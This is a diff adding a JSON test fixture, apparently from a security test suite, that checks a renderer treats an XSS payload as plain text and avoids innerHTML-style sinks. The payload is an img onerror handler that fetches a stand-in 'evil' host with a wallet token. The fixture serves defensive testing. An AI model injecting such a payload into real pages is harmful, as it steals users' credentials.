@@ -1,0 +1,11 @@
+{
+  "id": "render-xss-img-onerror-001",
+  "category": "render",
+  "vector": "event_handler_attribute",
+  "payload": "<img src=x onerror=\"fetch('http://evil/' + window.__LOCALWALLET__.token)\">",
+  "expectation": {
+    "render_contract": "text_content_only",
+    "inert_as_text": true,
+    "forbidden_html_sinks": ["innerHTML", "outerHTML", "insertAdjacentHTML"]
+  }
+}
